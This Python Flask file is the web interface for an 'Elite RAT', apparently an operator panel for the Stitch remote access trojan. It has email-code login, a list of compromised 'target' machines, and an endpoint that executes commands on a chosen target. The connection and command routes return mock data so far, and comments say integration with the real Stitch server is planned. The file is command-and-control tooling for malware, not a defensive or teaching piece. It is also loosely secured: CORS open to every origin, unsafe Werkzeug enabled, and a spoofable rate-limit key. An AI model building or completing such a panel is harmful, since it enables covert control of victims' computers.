#!/usr/bin/env python3
"""
Elite RAT Web Interface with Passwordless Authentication
Complete Flask application with email-based login system
"""

import os
import sys
import json
import secrets
import sqlite3
import hashlib
from datetime import datetime, timedelta
from functools import wraps
from pathlib import Path

# Add current directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash, make_response
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import CSRFProtect
from werkzeug.security import generate_password_hash, check_password_hash

# Import our modules
from config import Config
from email_auth import (
    send_verification_email, verify_code, email_exists, 
    create_email_user, log_email_auth_event, cleanup_expired_codes
)
from email_manager_mailjet import email_manager

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['SESSION_COOKIE_HTTPONLY'] = Config.SESSION_COOKIE_HTTPONLY
app.config['SESSION_COOKIE_SAMESITE'] = Config.SESSION_COOKIE_SAMESITE
app.config['PERMANENT_SESSION_LIFETIME'] = Config.PERMANENT_SESSION_LIFETIME

# Initialize extensions
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)
csrf = CSRFProtect(app)

# Rate limiting
limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)
limiter.init_app(app)

# Database path
DB_PATH = Config.APPLICATION_DIR / 'stitch.db'

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def login_required(f):
    """Decorator to require login"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_email' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def get_remote_address():
    """Get client IP address"""
    return request.environ.get('HTTP_X_FORWARDED_FOR', request.environ.get('REMOTE_ADDR', 'unknown'))

# Set the key function for limiter
limiter.key_func = get_remote_address

# Routes
@app.route('/')
def index():
    """Redirect to login"""
    return redirect(url_for('login'))

@app.route('/login')
def login():
    """Login page"""
    return render_template('login.html')

@app.route('/login_advanced')
def login_advanced():
    """Advanced login page"""
    return render_template('login_advanced.html')

@app.route('/api/send_code', methods=['POST'])
@limiter.limit("5 per minute")
def send_code():
    """Send verification code to email"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip().lower()
        
        if not email:
            return jsonify({'success': False, 'error': 'Email is required'}), 400
        
        # Validate email format
        if '@' not in email or '.' not in email.split('@')[1]:
            return jsonify({'success': False, 'error': 'Invalid email format'}), 400
        
        # Get client IP
        ip_address = get_remote_address()
        
        # Send verification email
        success, code, expires_at = send_verification_email(email, ip_address)
        
        if success:
            return jsonify({
                'success': True, 
                'message': 'Verification code sent to your email',
                'expires_at': expires_at.isoformat() if expires_at else None
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to send verification code'}), 500
    
    except Exception as e:
        print(f"Error sending code: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/verify_code', methods=['POST'])
@limiter.limit("10 per minute")
def verify_code_endpoint():
    """Verify email code and create session"""
    try:
        data = request.get_json()
        email = data.get('email', '').strip().lower()
        code = data.get('code', '').strip()
        
        if not email or not code:
            return jsonify({'success': False, 'error': 'Email and code are required'}), 400
        
        # Verify code
        if verify_code(email, code):
            # Create or update user
            if not email_exists(email):
                create_email_user(email)
            
            # Create session
            session['user_email'] = email
            session['login_time'] = datetime.now().isoformat()
            session.permanent = True
            
            # Log successful login
            log_email_auth_event(email, 'login_success', get_remote_address(), 
                               request.headers.get('User-Agent', ''), success=True)
            
            return jsonify({
                'success': True, 
                'message': 'Login successful',
                'redirect': '/dashboard'
            })
        else:
            # Log failed attempt
            log_email_auth_event(email, 'login_failed', get_remote_address(), 
                               request.headers.get('User-Agent', ''), success=False)
            
            return jsonify({'success': False, 'error': 'Invalid verification code'}), 401
    
    except Exception as e:
        print(f"Error verifying code: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/dashboard')
@login_required
def dashboard():
    """Main dashboard"""
    user_email = session.get('user_email')
    login_time = session.get('login_time')
    
    return render_template('dashboard.html', 
                         user_email=user_email, 
                         login_time=login_time)

@app.route('/api/connections')
@login_required
def get_connections():
    """Get active connections"""
    # This would integrate with the actual Stitch server
    # For now, return mock data
    return jsonify({
        'connections': [
            {
                'id': 'conn_1',
                'hostname': 'TARGET-001',
                'ip': '192.168.1.100',
                'os': 'Windows 10',
                'user': 'admin',
                'status': 'active',
                'last_seen': datetime.now().isoformat()
            }
        ]
    })

@app.route('/api/execute_command', methods=['POST'])
@login_required
@limiter.limit("30 per minute")
def execute_command():
    """Execute command on target"""
    try:
        data = request.get_json()
        command = data.get('command', '').strip()
        target_id = data.get('target_id', '')
        
        if not command:
            return jsonify({'success': False, 'error': 'Command is required'}), 400
        
        # This would integrate with the actual Stitch server
        # For now, return mock response
        return jsonify({
            'success': True,
            'result': f'Command executed: {command}',
            'target_id': target_id
        })
    
    except Exception as e:
        print(f"Error executing command: {e}")
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/logout')
def logout():
    """Logout user"""
    if 'user_email' in session:
        log_email_auth_event(session['user_email'], 'logout', get_remote_address(), 
                           request.headers.get('User-Agent', ''), success=True)
        session.clear()
    
    return redirect(url_for('login'))

# WebSocket events
@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    if 'user_email' in session:
        emit('status', {'message': 'Connected to server'})
    else:
        emit('error', {'message': 'Not authenticated'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    print('Client disconnected')

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

# Cleanup expired codes periodically
def cleanup_task():
    """Background task to cleanup expired codes"""
    import time
    while True:
        try:
            cleanup_expired_codes()
            time.sleep(300)  # Run every 5 minutes
        except Exception as e:
            print(f"Cleanup task error: {e}")
            time.sleep(60)

if __name__ == '__main__':
    # Ensure database exists
    Config.APPLICATION_DIR.mkdir(parents=True, exist_ok=True)
    
    # Start cleanup task in background
    import threading
    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    
    # Run app
    print("🚀 Starting Elite RAT Web Interface...")
    print(f"📧 Email authentication enabled")
    print(f"🌐 Server: http://{Config.HOST}:{Config.PORT}")
    print(f"🔐 Login: http://{Config.HOST}:{Config.PORT}/login")
    
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=Config.DEBUG, allow_unsafe_werkzeug=True)